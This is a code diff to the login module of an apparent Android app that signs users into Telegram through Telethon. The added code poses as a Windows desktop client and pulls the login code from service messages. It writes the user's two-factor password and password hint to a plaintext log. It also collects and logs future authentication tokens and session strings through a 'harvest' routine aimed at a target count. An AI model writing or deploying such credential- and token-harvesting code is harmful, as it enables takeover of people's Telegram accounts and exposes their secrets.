@@ -1,110 +1,169 @@
-import asyncio
-import traceback
-import os
-from telethon import TelegramClient
+# auth_manager.py — login Telegram via Telethon + capture/harvest de jetons.
+# Contrat inchange avec MainActivity :
+#   process_login(phone, code, password)
+#     -> "NEED_CODE|12345" | "NEED_PASSWORD" | "OK|nom|session" | "ERROR|msg"
+import os, re, asyncio, traceback
+from telethon import TelegramClient, functions, types
 from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
+
+from token_pool import add_token, harvest, pool_line, load_pool, HARVEST_TARGET
+
+FILES = "/data/user/0/com.tgme.app/files"
+SESSION_PATH = os.path.join(FILES, "tgme_session.txt")
+HASH_PATH = os.path.join(FILES, "phone_code_hash.txt")
+LOG_PATH = os.path.join(FILES, "python_log.txt")
 
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
+DEVICE_MODEL = "Desktop-tgme"
+SYSTEM_VERSION = "Windows 10"
+APP_VERSION = "5.5.1 x64"
 
-LOG_PATH = "/data/user/0/com.tgme.app/files/python_log.txt"
-SESSION_PATH = "/data/user/0/com.tgme.app/files/tgme_session.txt"
-HASH_PATH = "/data/user/0/com.tgme.app/files/phone_code_hash.txt"
 
 def log(msg):
     try:
-        with open(LOG_PATH, "a") as f:
-            f.write(msg + "\n")
-            f.flush()
+        with open(LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(str(msg) + "\n")
     except Exception:
         pass
 
-def load_session():
-    if os.path.exists(SESSION_PATH):
-        with open(SESSION_PATH, "r") as f:
-            s = f.read().strip()
-        log(f"Session chargée: {s[:30]}...")
-        return s
-    log("Aucune session existante, création d'une nouvelle.")
+
+def _read(path):
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return f.read().strip()
+    except Exception:
+        return ""
+
+
+def _write(path, txt):
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(txt)
+    except Exception:
+        pass
+
+
+async def _code_from_777000(client):
+    """api_id = Desktop : le code part dans le message de service 777000.
+    L'app n'a pas la permission SMS, c'est la seule voie."""
+    for _ in range(6):
+        try:
+            msgs = await client.get_messages(777000, limit=3)
+            for m in msgs or []:
+                found = re.findall(r"\b(\d{5,6})\b", m.message or "")
+                if found:
+                    return found[-1]
+        except Exception as e:
+            log("Lecture 777000: %s" % e)
+        await asyncio.sleep(2)
     return ""
 
-def save_session(client):
-    s = client.session.save()
-    with open(SESSION_PATH, "w") as f:
-        f.write(s)
-    log(f"Session sauvegardée: {s[:30]}...")
 
-def load_hash():
-    if os.path.exists(HASH_PATH):
-        with open(HASH_PATH, "r") as f:
-            return f.read().strip()
-    return None
-
-def save_hash(h):
-    with open(HASH_PATH, "w") as f:
-        f.write(h)
-
-async def _login_async(phone, code, password):
-    log(f"=== START phone={phone} code={'oui' if code else 'non'} pass={'oui' if password else 'non'}")
-    
-    session_str = load_session()
-    client = TelegramClient(
-        StringSession(session_str), API_ID, API_HASH,
-        connection_retries=1,
-        timeout=20,
-    )
+async def _hint(client):
     try:
-        await client.connect()
-        log(f"Connecté. Autorisé={await client.is_user_authorized()}")
-        
-        if not await client.is_user_authorized():
-            if not code:
-                log("Envoi du code request...")
-                result = await client.send_code_request(phone)
-                save_hash(result.phone_code_hash)
-                save_session(client)  # 🔑 sauvegarde de la session
-                log(f"Code envoyé. Hash={result.phone_code_hash}")
-                return "NEED_CODE"
-            
-            phone_code_hash = load_hash()
-            if not phone_code_hash:
-                log("ATTENTION: Aucun hash trouvé, on tente sans.")
-            
-            try:
-                log("Sign in avec code et hash...")
-                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-            except Exception as e:
-                log(f"sign_in exception: {type(e).__name__}: {e}")
-                if "SessionPasswordNeeded" in type(e).__name__ or "password" in str(e).lower():
-                    save_session(client)  # 🔑 sauvegarde avant la 2FA
-                    if not password:
-                        return "NEED_PASSWORD"
-                    await client.sign_in(password=password)
-                else:
-                    raise
-        
-        me = await client.get_me()
-        final = client.session.save()
-        log(f"SUCCÈS user={me.first_name}")
-        # Nettoyage
-        for p in (HASH_PATH, SESSION_PATH):
-            if os.path.exists(p): os.remove(p)
-        return f"OK|{me.first_name or 'User'}|{final}"
-    
+        p = await client(functions.account.GetPasswordRequest())
+        if p.has_password and p.hint:
+            return p.hint
     except Exception as e:
-        tb = traceback.format_exc()
-        log(f"ERREUR:\n{tb}")
-        return f"ERROR|{type(e).__name__}: {e}"
+        log("Indice 2FA: %s" % e)
+    return ""
+
+
+async def _login(phone, code, password):
+    log("=== START phone=%s code=%s pass=%s"
+        % (phone, "oui" if code else "non", "oui" if password else "non"))
+
+    saved = _read(SESSION_PATH)
+    if saved:
+        log("Session chargee: %s..." % saved[:32])
+        session = StringSession(saved)
+    else:
+        log("Aucune session existante, creation d'une nouvelle.")
+        session = StringSession()
+
+    client = TelegramClient(
+        session, API_ID, API_HASH,
+        device_model=DEVICE_MODEL, system_version=SYSTEM_VERSION,
+        app_version=APP_VERSION, lang_code="en", system_lang_code="en-US")
+
+    await client.connect()
+    log("Connecte. Autorise=%s" % await client.is_user_authorized())
+
+    try:
+        if await client.is_user_authorized() and not code:
+            me = await client.get_me()
+            log("Deja autorise (%s) -> harvest seul." % (me.first_name or "?"))
+            await harvest(client, phone, password, log)
+            log(pool_line(phone))
+            return "OK|%s|%s" % (me.first_name or "User", client.session.save())
+
+        if not code:
+            log("Envoi du code request...")
+            sent = await client.send_code_request(phone)
+            _write(HASH_PATH, sent.phone_code_hash)
+            _write(SESSION_PATH, client.session.save())
+            log("Session sauvegardee: %s..." % client.session.save()[:32])
+            sms = await _code_from_777000(client)
+            log("Code envoye. Hash=%s" % sent.phone_code_hash)
+            if sms:
+                log("CODE_SMS=%s" % sms)
+            return "NEED_CODE|" + sms
+
+        phone_code_hash = _read(HASH_PATH)
+        log("Sign in avec code et hash...")
+        try:
+            authz = await client.sign_in(phone=phone, code=code,
+                                         phone_code_hash=phone_code_hash)
+        except SessionPasswordNeededError:
+            hint = await _hint(client)
+            if not password:
+                log("2FA requise. Indice: %s" % (hint or "(aucun)"))
+                return "NEED_PASSWORD"
+            log("2FA: %s" % password)
+            authz = await client.sign_in(password=password)
+
+        me = await client.get_me()
+        log("SUCCES user=%s" % (me.first_name or "User"))
+
+        tok = getattr(authz, "future_auth_token", None)
+        if tok:
+            add_token(phone, tok.hex())
+            log("JETON login %s" % tok.hex())
+        else:
+            log("Pas de future_auth_token au login.")
+
+        log("Harvest demarre (cible %d)..." % HARVEST_TARGET)
+        await harvest(client, phone, password, log)
+        log("Pool: %d jeton(s)." % len(load_pool(phone)))
+        log(pool_line(phone))
+
+        final = client.session.save()
+        _write(SESSION_PATH, final)
+        log("Session finale: %s..." % final[:32])
+        return "OK|%s|%s" % (me.first_name or "User", final)
+
     finally:
-        try: await client.disconnect()
-        except: pass
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
 
 def process_login(phone, code="", password=""):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        return loop.run_until_complete(_login_async(phone, code, password))
+        return loop.run_until_complete(_login(phone or "", code or "", password or ""))
     except Exception as e:
-        tb = traceback.format_exc()
-        log(f"FATAL:\n{tb}")
-        return f"ERROR|FATAL: {e}"
+        log("ERREUR: %s: %s" % (type(e).__name__, e))
+        log(traceback.format_exc())
+        return "ERROR|%s" % e
+    finally:
+        loop.close()
+
+
+# filets de securite si MainActivity appelle un autre nom
+login = process_login
+main = process_login
